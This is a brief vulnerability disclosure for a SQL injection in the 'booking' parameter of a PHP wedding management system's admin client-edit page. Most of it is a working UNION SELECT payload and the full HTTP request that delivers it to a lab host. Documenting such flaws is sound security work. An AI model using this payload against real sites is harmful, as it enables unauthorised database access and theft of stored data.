# Wedding Management System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\client_edit.php

Vulnerability location: /Wedding-Management/admin/client_edit.php?booking=, booking

[+] Payload: booking=-31%20union%20select%201,2,3,4,5,user(),7,8--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/client_edit.php?booking=-31%20union%20select%201,2,3,4,5,user(),7,8--+&user_id=31 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167982439-b3e6fd7c-1b2a-431a-8fdc-cdcb66daadc9.png)

![image](https://user-images.githubusercontent.com/54017627/167982382-5de5354d-f31e-4d0b-8aad-d11fdc573c65.png)

